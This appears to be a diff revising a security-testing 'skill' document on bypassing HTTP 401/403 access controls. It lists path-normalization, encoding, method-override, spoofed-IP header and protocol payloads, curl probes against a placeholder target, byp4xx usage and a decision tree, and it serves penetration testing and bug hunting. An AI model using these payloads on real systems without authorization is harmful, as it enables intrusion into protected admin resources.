@@ -6,41 +6,37 @@ revision_date: 2026-08-31
 license: MIT
 platforms: [linux]
 compatibility: Requires curl; byp4xx is optional.
-tags: [recon, authorization, http, access-control, path-normalization]
-category: recon
-related_skills:
-  - hunt-auth-bypass
-  - hunt-http-smuggling
-  - hunt-ssrf
-  - hunt-idor
+metadata:
+  tags: [recon, authorization, http, access-control, path-normalization]
+  category: recon
+  related_skills:
+    - hunt-auth-bypass
+    - hunt-http-smuggling
+    - hunt-ssrf
+    - hunt-idor
 ---
 
 # 401/403 Bypass Techniques
 
-A useful 401/403 bypass candidate often appears when two HTTP-processing layers
-make different decisions about the same request. Common boundaries are CDN →
-reverse proxy, reverse proxy → web server, web server → framework, and framework
-→ route-level authorization. The useful signal is a change in routing or
-protected content, not a status code by itself.
+A bypass candidate appears when two HTTP-processing layers (CDN, reverse proxy,
+web server, framework) decide differently about the same request. The useful
+signal is a change in routing or protected content, not a status code alone.
 
 ## When to Use
 
 - A known route returns `401 Unauthorized` or `403 Forbidden`.
 - A reverse proxy, WAF, API gateway, or CDN sits in front of the application.
-- Frontend and backend components normalize paths or methods differently.
-- IIS, Tomcat, Spring, Apache, Nginx, WebDAV, or framework-specific routing is visible.
-- Equivalent paths produce different status, headers, redirects, body structure, or backend behavior.
+- Frontend and backend normalize paths, methods, or headers differently.
+- IIS, Tomcat, Spring, Apache, Nginx, or WebDAV routing is visible.
+- Equivalent requests return different status, headers, or body, hinting at a routing differential.
 
 ## Prerequisites
 
-- An HTTP client that preserves raw paths, such as `curl --path-as-is` or Burp Repeater.
-- A denied baseline request and a stable marker for the expected protected resource.
-- Optional tooling: `byp4xx`, `dirsearch`, `feroxbuster`, Burp Intruder, `nghttp`, and `nc`.
-- Visibility into redirects and response bodies; status-only probing loses important differentials.
+- An HTTP client that preserves raw paths: `curl --path-as-is` or Burp Repeater.
+- A denied baseline request plus a marker for the expected protected content.
+- Optional tooling: `byp4xx`, `dirsearch`, `feroxbuster`, Burp Intruder, `nghttp`, `nc`.
 
 ## How to Run
-
-Capture a denied baseline without following redirects:
 
 ```bash
 TARGET="https://target.example"
@@ -48,501 +44,360 @@ PATH_DENIED="/admin"
 OUTDIR="${OUTPUT_DIR:-./output}/401-403"
 mkdir -p "$OUTDIR"
 
-curl -sS --path-as-is --max-time 10 --connect-timeout 5 \
-  -D "$OUTDIR/baseline.headers" \
-  -o "$OUTDIR/baseline.body" \
+# Denied baseline: record status, headers, and body for comparison.
+curl -sS --path-as-is --max-time 10 \
+  -D "$OUTDIR/baseline.headers" -o "$OUTDIR/baseline.body" \
   -w 'status=%{http_code} bytes=%{size_download} redirect=%{redirect_url}\n' \
   "$TARGET$PATH_DENIED"
 
-# Compare one path, method, and header differential.
-curl -sS --path-as-is --max-time 10 -i \
-  "$TARGET/./${PATH_DENIED#/}"
+# Compare candidates against the baseline.
+curl -sS --path-as-is --max-time 10 -i "$TARGET/./${PATH_DENIED#/}"
 curl -sS --path-as-is --max-time 10 -i -X OPTIONS "$TARGET$PATH_DENIED"
-curl -sS --path-as-is --max-time 10 -i \
-  -H 'X-Forwarded-For: 127.0.0.1' "$TARGET$PATH_DENIED"
+curl -sS --path-as-is --max-time 10 -i -H 'X-Forwarded-For: 127.0.0.1' "$TARGET$PATH_DENIED"
 ```
 
-For each candidate, preserve the raw path and compare status, `Location`, body
-length, title, content type, cache headers, and a stable protected-content marker.
+For each candidate, compare status, `Location`, body length, title, and a
+protected-content marker against the baseline.
 
 ## Procedure
 
-### Phase 1 — Capture and Classify the Baseline
+### 1. Path Manipulation Bypasses
 
-1. Record the denied response with the command from `How to Run`.
-2. Save status, headers, redirect target, body length, title, and a stable body marker.
-3. Identify whether the denial resembles a CDN/WAF, proxy, server, framework, or application response.
-4. Use the same baseline fingerprint when comparing every later phase.
+The core idea: the reverse proxy/WAF checks one path format, but the backend
+normalizes differently. The `✓` marks request forms that commonly reach the
+backend through a different route; a `200` alone is not proof of access (see
+Verification).
 
-### Phase 2 — Test Path Normalization
+#### 1.1 Trailing Slash / Missing Slash
 
-The central question is whether the access-control layer and route handler use
-the same canonical path.
-
-#### Trailing Slash, Dot, and Empty Segments
-
-```text
-/admin
-/admin/
-/admin.
-/admin/.
-/./admin
-//admin
-///admin///
-/admin//
+```
+/admin      → 403
+/admin/     → 200  ✓ (trailing slash)
+/admin/.    → 200  ✓ (trailing dot)
 ```
 
-- `/admin/` tests slash-sensitive location and route matching.
-- `/admin.` tests trailing-dot handling, especially on Windows-backed stacks.
-- `/admin/.` and `/./admin` test dot-segment removal.
-- Duplicate slashes test whether only one layer collapses empty segments.
+#### 1.2 Case Sensitivity
 
-Use `--path-as-is`; otherwise the client may normalize the candidate before it
-reaches the target.
-
-#### Case Sensitivity
-
-```text
-/admin
-/Admin
-/ADMIN
-/aDmIn
+```
+/admin      → 403
+/Admin      → 200  ✓
+/ADMIN      → 200  ✓
+/aDmIn      → 200  ✓
 ```
 
-This is most relevant when a case-sensitive proxy rule fronts a case-insensitive
-filesystem or router, particularly IIS/ASP.NET and Windows-hosted applications.
+Works when: proxy rule is case-sensitive but backend is case-insensitive
+(common on Windows/IIS).
 
-#### Percent Encoding
+#### 1.3 URL Encoding
 
-```text
-/%61dmin
-/admi%6e
-/%61%64%6d%69%6e
-/%2e/admin
-/admin%2f
-/admin%3fignored
+```
+/admin          → 403
+/%61dmin        → 200  ✓ (encode 'a')
+/admi%6e        → 200  ✓ (encode 'n')
+/%61%64%6d%69%6e → 200  ✓ (full encode)
 ```
 
-Test whether decoding happens before or after location matching. Encoded `/`,
-`.`, `?`, and path characters are especially useful when a gateway and backend
-decode at different stages.
+#### 1.4 Double URL Encoding
 
-#### Double Encoding
-
-```text
-/%2561dmin
-/admin%252f
-/%252e/admin
-/admin..%252f
+```
+/admin              → 403
+/%2561dmin          → 200  ✓ (%25 = %, decoded twice: %61 → a)
+/admin%252f         → 200  ✓
+/admin..%252f       → 200  ✓
 ```
 
-`%25` becomes `%` after the first decode. These variants matter when one layer
-decodes once and another layer decodes again.
+#### 1.5 Unicode / UTF-8 Encoding
 
-#### Legacy UTF-8 and Null-Byte Parsing
-
-```text
-/%C0%AFadmin     overlong UTF-8 form of `/`
-/%C0%AE/admin    overlong UTF-8 form of `.`
-/admi%C1%AE      overlong UTF-8 form of `n`
-/admin%00
-/admin%00.json
-/%00/admin
+```
+/admin          → 403
+/admi%C0%AE     → 200  ✓ (overlong UTF-8 for '.')
+/admi%C0%6E     → 200  ✓ (overlong UTF-8 for 'n')
+/%C0%AFadmin    → 200  ✓ (overlong UTF-8 for '/')
 ```
 
-These are legacy parser behaviors. Modern UTF-8 decoders reject overlong forms,
-and modern managed runtimes usually reject embedded NUL bytes. They remain
-relevant to older native modules, legacy gateways, and mixed decoding chains.
+Modern UTF-8 decoders reject overlong forms; these target legacy parsers and
+mixed decoding chains.
 
-#### Path Parameters and Matrix Variables
+#### 1.6 Dot-Segment / Path Traversal
 
-```text
-/admin;
-/admin;foo=bar
-/admin;x
-/;/admin
-/admin..;/
-/admin;.css
-/admin;jsessionid=marker
+```
+/admin          → 403
+/./admin        → 200  ✓
+//admin         → 200  ✓
+/admin/./       → 200  ✓
+/.//admin       → 200  ✓
+/admin..;/      → 200  ✓ (Tomcat path parameter)
 ```
 
-Semicolon segments are significant in Java/Tomcat and frameworks that support
-matrix parameters. A proxy may compare the literal segment while the application
-strips or separately parses the parameter.
+#### 1.7 Null Byte
 
-#### Suffix and Extension Handling
-
-```text
-/admin.json
-/admin.html
-/admin.css
-/admin.anything
-/admin%20
-/admin%09
-/admin%0d
-/admin%0a
-/admin~
-/admin?
-/admin%23fragment
-/admin#fragment
+```
+/admin          → 403
+/admin%00       → 200  ✓
+/admin%00.json  → 200  ✓
+/%00/admin      → 200  ✓
 ```
 
-Encoded `#` is sent as part of the request target; a literal fragment is not sent
-by browsers and only matters when a raw client or intermediary treats it as path
-data. Control-character suffixes target legacy request-line or parser handling.
-Suffix matching is mainly relevant to older framework configurations and
-extension-based rewrite rules.
+Relevant to older native modules; modern managed runtimes usually reject
+embedded NUL bytes.
 
-#### Backslash and Windows Path Handling
+#### 1.8 Path Parameter Injection
 
-```text
-/admin\
-\admin
-/admin\..\admin
-/admin::$DATA
+```
+/admin          → 403
+/admin;foo=bar  → 200  ✓ (Tomcat/Java treats ; as path param)
+/admin;         → 200  ✓
+/admin;x        → 200  ✓
 ```
 
-Backslash and NTFS alternate-data-stream forms are IIS/Windows-specific. ADS
-handling is primarily legacy, but backslash normalization still differs between
-URL parsers, security filters, and Windows path APIs.
+#### 1.9 Trailing Special Characters
 
-#### Combined Path Transformations
-
-```text
-///Admin///
-/./%61dmin/
-/./admin/./
-/admin..;/admin
-/admin/..;/admin
-/admin../
-/%252e//Admin;
-/admin%252f..%252fadmin
+```
+/admin%20 (space)  /admin%09 (tab)   /admin? (empty query)
+/admin.json        /admin.html       /admin/~
 ```
 
-Combinations are useful after a single transformation identifies the layer that
-normalizes differently. Combining random mutations without a parser hypothesis
-produces noisy results that are difficult to interpret.
+#### 1.10 Backslash (Windows/IIS)
 
-### Phase 3 — Test Method Dispatch
-
-#### Direct Method Changes
-
-```text
-GET      /admin
-HEAD     /admin
-OPTIONS  /admin
-POST     /admin
-PUT      /admin
-PATCH    /admin
-DELETE   /admin
-TRACE    /admin
-CONNECT  /admin
+```
+/admin\    /admin\..\/    \..\admin
 ```
 
-- `HEAD` is bodyless and may use a different route path; it does not prove body access.
-- `OPTIONS` can expose method registration or CORS behavior without invoking the protected handler.
-- `POST`, `PUT`, `PATCH`, and `DELETE` are state-changing methods when the route implements their normal semantics.
-- `TRACE` tests server reflection and method filtering; it does not retrieve the protected representation.
-- `CONNECT` primarily tests proxy handling and tunnel policy, not ordinary origin routing.
+#### 1.11 Combined Path Tricks
 
-#### Method Override Headers and Parameters
-
-```http
-POST /admin HTTP/1.1
-X-HTTP-Method-Override: PUT
-
-POST /admin HTTP/1.1
-X-Method-Override: PATCH
-
-POST /admin HTTP/1.1
-X-HTTP-Method: DELETE
-
-POST /admin HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-
-_method=PUT
+```
+///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin
 ```
 
-Override behavior appears in frameworks and middleware that tunnel methods
-through `POST`. The differential exists when the filtering layer checks the
-outer method while the route dispatcher uses the overridden method.
+### 2. HTTP Method Bypass
 
-#### Custom and WebDAV Methods
+#### 2.1 Direct Method Change
 
-```text
-FOOBAR    /admin
-GETS      /admin
-PROPFIND  /admin
-MOVE      /admin
-COPY      /admin
-MKCOL     /admin
-LOCK      /admin
-UNLOCK    /admin
+```
+GET  /admin → 403
+POST /admin → 200  ✓
+PUT  /admin → 200  ✓
+PATCH /admin → 200  ✓
+DELETE /admin → 200  ✓
+OPTIONS /admin → 200  ✓ (may leak allowed methods)
+TRACE /admin → 200  ✓ (may reflect headers — XST)
+HEAD /admin → 200  ✓ (bodyless response; does not by itself confirm access to the protected body)
 ```
 
-Custom verbs test allowlist assumptions. WebDAV verbs are useful when WebDAV is
-enabled on IIS, Apache, a storage gateway, or a reverse proxy with DAV support.
+#### 2.2 Method Override Headers
 
-### Phase 4 — Test Header Interpretation
-
-#### Rewrite and Original-Path Headers
-
-```http
-GET / HTTP/1.1
-X-Original-URL: /admin
-
-GET / HTTP/1.1
-X-Rewrite-URL: /admin
-```
-
-These are consumed by particular rewrite middleware, IIS modules, gateways, and
-application stacks. Nginx does not universally honor them by itself. The tested
-condition is whether the frontend authorizes `/` while a downstream component
-routes the header-provided path.
-
-#### Forwarding and Client-IP Headers
-
-```text
-X-Forwarded-For
-X-Real-IP
-X-Originating-IP
-X-Remote-IP
-X-Remote-Addr
-X-Client-IP
-True-Client-IP
-Cluster-Client-IP
-X-ProxyUser-IP
-X-Custom-IP-Authorization
-Forwarded
-```
-
-Common loopback/private values:
-
-```text
-127.0.0.1
-127.1
-10.0.0.1
-0.0.0.0
-::1
-2130706433
-0177.0.0.1
-0x7f000001
-localhost
-```
-
-This family tests trusted-proxy configuration: the application must consume a
-client-controlled forwarding header as the effective source address. Numeric,
-octal, hexadecimal, shortened, and hostname forms are parser-dependent.
-
-For the standardized form, send the value as a structured field rather than as
-an IP-only header:
-
-```http
-Forwarded: for=127.0.0.1;proto=https;host=localhost
-```
-
-#### Routing and Content-Negotiation Headers
-
-```http
-Referer: https://target.example/admin
-Origin: https://target.example
-Host: localhost
-X-Forwarded-Host: localhost
-X-Forwarded-Proto: https
-Content-Type: application/json
-X-Requested-With: XMLHttpRequest
-Accept: application/json
-```
-
-These test referer/origin checks, virtual-host routing, forwarded scheme/host
-handling, content-type-specific routes, AJAX-only branches, and representation
-negotiation.
-
-### Phase 5 — Test Protocol Variants
-
-#### HTTP/1.0
-
-```bash
-curl -sS --http1.0 --path-as-is -i "https://target.example/admin"
-```
-
-HTTP/1.0 changes persistent-connection behavior and may traverse a different
-proxy or ACL path. Host handling also differs on legacy intermediaries.
-
-#### HTTP/0.9
-
-```bash
-printf 'GET /admin\r\n' | nc target.example 80
-```
-
-HTTP/0.9 is legacy and has no response headers. It is relevant only when an old
-listener or compatibility path accepts the request form while a newer frontend
-expects HTTP/1.x semantics.
-
-#### HTTP/2 Pseudo-Headers
-
-```http
-:method: GET
-:scheme: https
-:authority: target.example
-:path: /admin
-```
-
-Test `:path` normalization, `:authority` versus `Host`, duplicate-header
-handling after H2-to-H1 translation, and differences between edge and origin
-protocol parsers. Use `hunt-http-smuggling` when the differential crosses
-request boundaries rather than only route authorization.
-
-#### WebSocket Upgrade
+When the proxy blocks by method, but the backend reads override headers:
 
 ```http
 GET /admin HTTP/1.1
-Host: target.example
-Connection: Upgrade
-Upgrade: websocket
-Sec-WebSocket-Version: 13
-Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+X-HTTP-Method-Override: PUT
+
+GET /admin HTTP/1.1
+X-Method-Override: POST
+
+GET /admin HTTP/1.1
+X-HTTP-Method: DELETE
+
+POST /admin HTTP/1.1
+X-HTTP-Method-Override: PATCH
+_method=PUT  (in POST body — Rails, Laravel)
 ```
 
-Use this only when the target exposes a WebSocket route or an intermediary
-handles upgrade requests differently from ordinary HTTP. A `101 Switching
-Protocols` response confirms a handshake path, not access to the protected HTTP
-representation; verify the resulting channel and route semantics separately.
+#### 2.3 Custom / Invalid Methods
 
-### Phase 6 — Combine Confirmed Differentials
+```
+FOOBAR /admin HTTP/1.1     → some ACLs only check GET/POST
+GETS /admin HTTP/1.1       → typo-like methods may bypass
+CONNECT /admin HTTP/1.1    → proxy may tunnel
+PROPFIND /admin HTTP/1.1   → WebDAV method
+MOVE /admin HTTP/1.1       → WebDAV method
+```
+
+### 3. Header-Based Bypass
+
+#### 3.1 URL Rewrite Headers (Reverse Proxy / IIS ARR)
+
+These headers tell the backend the "real" URL, bypassing proxy-level path
+checks:
 
 ```http
-POST / HTTP/1.1
+GET / HTTP/1.1
 X-Original-URL: /admin
-X-HTTP-Method-Override: GET
 
-GET /%61dmin HTTP/1.1
-X-Forwarded-For: 127.0.0.1
-
-GET /Admin HTTP/1.0
-X-Forwarded-Host: localhost
-
-PROPFIND /admin;marker HTTP/1.1
+GET / HTTP/1.1
 X-Rewrite-URL: /admin
 ```
 
-Build combinations from observed behavior: path mutations target canonicalization,
-method variants target dispatch, headers target trust/routing, and protocol
-variants target intermediary parsing.
+The proxy sees `GET /` (allowed), but the backend routes to `/admin`.
 
-### Phase 7 — Apply Stack-Specific Checks
+#### 3.2 IP Spoofing Headers (Whitelist Bypass)
 
-| Stack | Differential to test | Technical condition |
-|---|---|---|
-| Apache | Directory slash redirects, `PATH_INFO`, `mod_rewrite` decoding | Authorization and rewrite phases use different URI forms |
-| Nginx | Exact/prefix/regex `location`, normalized URI, `proxy_pass` URI replacement | Location check and upstream URI construction diverge |
-| IIS/ASP.NET | Case folding, backslashes, extension mapping, legacy ADS forms | Windows path handling differs from URL filtering |
-| Tomcat/Java | Semicolon matrix parameters, `..;`, encoded slash handling | Connector/proxy and servlet path parsing diverge |
-| Spring MVC | Trailing slash, older suffix pattern matching, path decoding | Security matcher and controller mapping use different patterns |
-| Node/Express | Repeated slash, case-sensitive/strict routing options, mounted routers | Proxy path and Express route options disagree |
-| WebDAV | `PROPFIND`, `MOVE`, `COPY`, `MKCOL`, locking methods | DAV handler has a different method or path policy |
+Headers to try (each with values `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`):
 
-### Phase 8 — Automate for Coverage
+```http
+X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
+X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
+X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1
+```
 
-| Tool | Use |
+IP encoding variants: `0177.0.0.1` (octal), `2130706433` (decimal),
+`0x7f000001` (hex), `localhost`
+
+#### 3.3 Other Header Tricks
+
+```http
+Referer: https://target.com/admin     # Referrer check bypass
+Origin: https://target.com             # Origin check bypass
+Host: localhost                         # Host header manipulation
+X-Forwarded-Host: localhost            # Forwarded host
+Content-Type: application/json         # Content-type switch
+X-Requested-With: XMLHttpRequest       # AJAX flag
+```
+
+### 4. Protocol Version Bypass
+
+```http
+# HTTP/1.0 (some ACLs only apply to HTTP/1.1)
+GET /admin HTTP/1.0
+
+# HTTP/0.9 (extremely legacy — no headers)
+GET /admin
+
+# HTTP/2 pseudo-header tricks
+:method: GET
+:path: /admin
+:authority: target.com
+# See the hunt-http-smuggling skill for H2-specific bypasses, including h2c upgrade.
+```
+
+### 5. Verb Tampering + Path Combination
+
+Combine multiple techniques for higher success rate:
+
+```http
+POST / HTTP/1.1                          # method override + URL rewrite
+X-Original-URL: /admin
+X-HTTP-Method-Override: GET
+
+GET /%61dmin HTTP/1.1                    # IP spoof + path encoding
+X-Forwarded-For: 127.0.0.1
+
+GET /Admin HTTP/1.0                      # protocol + case + IP spoof
+X-Forwarded-For: 127.0.0.1
+```
+
+### 6. Technology-Specific Bypasses
+
+| Server | Key Tricks |
 |---|---|
-| [`byp4xx`](https://github.com/lobuhi/byp4xx) | Path, method, header, and protocol candidate generation |
-| `dirsearch` | Feed encoded and suffix variants through a custom wordlist |
-| `feroxbuster` | Recursive discovery with a prepared mutation wordlist |
-| Burp Intruder | Cartesian products of paths, methods, headers, and values |
-| Burp Repeater | Precise raw-path and response comparison |
+| **Apache** | `/admin/` (trailing slash), `/.admin` (dot prefix), `/admin%0d` (CR) |
+| **Nginx** | `/Admin` (case), `/admin../` (normalization), `X-Original-URL: /admin` |
+| **IIS/ASP.NET** | `/admin;.css` (path param+ext), `/admin\` (backslash), `/admin::$DATA` (ADS), `/admin%20` |
+| **Tomcat/Java** | `/admin;foo` (path param), `/admin..;/` (traversal), `/;/admin` (empty param) |
+| **Spring** | `/admin.anything` (suffix matching, older), `/admin/` (trailing slash) |
 
-#### byp4xx
+### 7. Automated Tools
+
+| Tool | Purpose | URL |
+|---|---|---|
+| **byp4xx** | Comprehensive 403 bypass scanner | github.com/lobuhi/byp4xx |
+| **dirsearch** | Directory brute-force with encoding variants | github.com/maurosoria/dirsearch |
+| **feroxbuster** | Recursive content discovery | github.com/epi052/feroxbuster |
+| **Burp Intruder** | Custom payload lists for manual testing | portswigger.net |
+
+#### byp4xx usage
 
 ```bash
-byp4xx -m 10 --rate 5 -xD "https://target.example/admin"
+# Basic usage: attempts path, method, header, and protocol variants.
+byp4xx -m 10 --rate 5 -xD "https://target.com/admin"
+
+# Output shows all attempted bypasses and their response codes.
+# Treat 200/301/302 rows as candidates; confirm each against the baseline.
 ```
 
-- `-m 10` sets the per-request timeout.
-- `--rate 5` sets the request rate.
-- `-xD` excludes default-credential checks so the run stays focused on 401/403 differentials.
+### 8. Decision Tree
 
-Automation output is a candidate list. Reproduce useful rows manually and
-compare their response semantics with the baseline.
-
-### Execution Flow
-
-```text
-Denied baseline
+```
+Got 401 or 403 on a path?
 │
-├── Path normalization
-│   ├── slash, dot-segment, duplicate slash
-│   ├── case and percent encoding
-│   ├── path parameters and suffixes
-│   └── legacy parser forms
+├── Try PATH MANIPULATION first (highest success rate)
+│   ├── /path/      (trailing slash)
+│   ├── /PATH       (case change)
+│   ├── /path%20    (trailing space)
+│   ├── /./path     (dot segment)
+│   ├── //path      (double slash)
+│   ├── /path;x     (path parameter — Java/Tomcat)
+│   ├── /path..;/   (Tomcat specific)
+│   ├── /%2e/path   (encoded dot)
+│   ├── /path%00    (null byte)
+│   ├── /path%23    (encoded hash)
+│   └── Result? → status/body differ from baseline = candidate
 │
-├── Method dispatch
-│   ├── HEAD and OPTIONS behavior
-│   ├── direct method changes
-│   ├── override headers/parameters
-│   └── custom and WebDAV methods
+├── Path tricks failed → Try METHOD BYPASS
+│   ├── POST/PUT/PATCH/DELETE/OPTIONS
+│   ├── HEAD (bodyless GET — verify body access separately)
+│   ├── X-HTTP-Method-Override: PUT
+│   └── TRACE (may reflect auth headers — XST)
 │
-├── Header interpretation
-│   ├── original/rewrite URL
-│   ├── forwarding/client IP
-│   └── host, origin, referer, content type
+├── Method tricks failed → Try HEADER BYPASS
+│   ├── X-Original-URL: /path      (reverse proxy/IIS rewrite)
+│   ├── X-Rewrite-URL: /path       (same concept)
+│   ├── X-Forwarded-For: 127.0.0.1 (IP whitelist)
+│   ├── X-Real-IP: 127.0.0.1
+│   ├── True-Client-IP: 127.0.0.1
+│   └── Referer: https://target.com/path
 │
-├── Protocol interpretation
-│   ├── HTTP/1.0
-│   ├── legacy HTTP/0.9
-│   └── HTTP/2 pseudo-header translation
+├── Header tricks failed → Try PROTOCOL BYPASS
+│   ├── HTTP/1.0 instead of 1.1
+│   ├── HTTP/2 h2c smuggling (hunt-http-smuggling)
+│   └── WebSocket upgrade
 │
-├── Combine confirmed differentials
+├── Single techniques failed → Try COMBINATIONS
+│   ├── Method + Path: POST /PATH/
+│   ├── Header + Path: X-Forwarded-For + /path%20
+│   ├── All three: POST + X-Original-URL + IP headers
+│   └── Protocol + Path: HTTP/1.0 + encoded path
 │
-├── Related techniques
-│   ├── hunt-auth-bypass
-│   ├── hunt-http-smuggling
-│   ├── hunt-ssrf
-│   └── hunt-idor
+├── All bypasses failed → Consider ALTERNATIVE APPROACHES
+│   ├── Request smuggling (hunt-http-smuggling) → smuggle past ACL
+│   ├── SSRF (hunt-ssrf) → access from server
+│   ├── IDOR (hunt-idor) → access data directly
+│   └── Auth flaws (hunt-auth-bypass) → login bypass
 │
-└── Automate for completeness, then reproduce manually
+└── Automated scan with byp4xx for completeness
 ```
 
-## Quick Reference
+## Quick Reference — Key Payloads
 
-| Candidate | Target component | Stack condition | Comparison signal |
-|---|---|---|---|
-| `/admin/`, `/./admin`, `//admin` | Path canonicalization | Proxy/backend normalize differently | Route, body, or redirect differs |
-| `/Admin` | Case handling | Case-sensitive edge, insensitive backend | Protected route marker appears |
-| `/%61dmin`, `/%2561dmin` | Decode stages | Single versus double decode | Backend route changes |
-| `/admin;foo`, `/admin..;/` | Matrix/path parameters | Java/Tomcat parsing | Servlet path differs from edge path |
-| `/admin\` | Path separators | IIS/Windows or mixed parser | Windows-backed route changes |
-| Method override header | Method dispatch | Middleware honors override after filtering | Handler/method behavior changes |
-| `PROPFIND /admin` | WebDAV handler | DAV enabled | DAV metadata or distinct method policy |
-| `X-Original-URL: /admin` | Rewrite middleware | Downstream consumes original URL | Root request reaches protected route |
-| `X-Forwarded-For: 127.0.0.1` | Trusted-proxy logic | Client header accepted as source IP | Internal-only branch appears |
-| HTTP/1.0 | Protocol ACL | Legacy intermediary path | Different frontend/backend response |
-| H2 `:path`/`:authority` | H2 translation | Edge converts to H1 differently | Routing or host policy changes |
+```http
+# Top 10 quick-wins (try these first)
+GET /admin/     HTTP/1.1        # trailing slash
+GET /Admin      HTTP/1.1        # case change
+GET /admin%20   HTTP/1.1        # trailing space
+GET /./admin    HTTP/1.1        # dot segment
+GET //admin     HTTP/1.1        # double slash
+POST /admin     HTTP/1.1        # method change
+GET / HTTP/1.1                  # X-Original-URL bypass
+X-Original-URL: /admin
+GET /admin HTTP/1.1             # IP whitelist bypass
+X-Forwarded-For: 127.0.0.1
+GET /admin;.css HTTP/1.1        # IIS path param
+GET /admin..;/ HTTP/1.1         # Tomcat bypass
+```
 
 ## Pitfalls
 
 - A `200` may be a login page, generic error, WAF challenge, SPA shell, or cached public response.
-- A `301` or `302` may only redirect to authentication; inspect `Location` and the destination body.
-- `HEAD` has no body, so body access must be tested with a method that returns the representation.
-- `OPTIONS` and `TRACE` expose method behavior but do not by themselves expose the protected route.
-- CDN, proxy, server, framework, and application layers may each normalize
-  differently; identify the layer responsible for the change.
-- Browser and command-line clients normalize URLs differently. Preserve raw paths when testing parser behavior.
-- Legacy forms are useful only when a compatible parser or compatibility layer is present.
-- Cache hits can make two distinct backend requests look identical, or make one
-  candidate look successful without reaching the protected handler.
+- A `301`/`302` may only redirect to authentication; inspect `Location` and the destination body.
+- `HEAD` has no body; `OPTIONS` and `TRACE` expose method behavior, not the protected content.
+- CDN, proxy, server, framework, and application layers may each normalize differently; identify the layer responsible for a change.
+- Browsers and CLI clients normalize URLs differently; use `--path-as-is`.
+- Some clients and servers collapse `//` and dot-segments before any check runs, so a candidate can hit the wire as the plain baseline path; confirm the raw request target (Burp Repeater shows what was actually sent).
+- Legacy parser forms only work where a compatible parser exists.
+- Cache hits can make distinct requests look identical or a candidate look successful without reaching the protected handler.
 
 ## Verification
 
-Compare every candidate with the denied baseline using:
-
-- status and reason phrase;
-- `Location`, `WWW-Authenticate`, `Allow`, cache, and content-type headers;
-- title, body length, structural similarity, and stable protected-content markers;
-- effective route, method-specific behavior, and backend-generated identifiers;
-- repeated requests with a cache buster when cache behavior is ambiguous.
-
-A bypass is technically meaningful when the alternate request reaches the
-protected representation or behavior that the denied baseline cannot reach.
-Status changes without that semantic difference are routing observations, not
-confirmed bypasses.
+- Compare every candidate with the denied baseline: status, reason phrase, `Location`, `WWW-Authenticate`, `Allow`, cache and content-type headers, title, body length, and protected-content markers.
+- Repeat with a cache buster when cache behavior is ambiguous.
+- A bypass is confirmed when the candidate reaches protected content or behavior the baseline cannot reach; a status change alone is an observation, not a bypass.
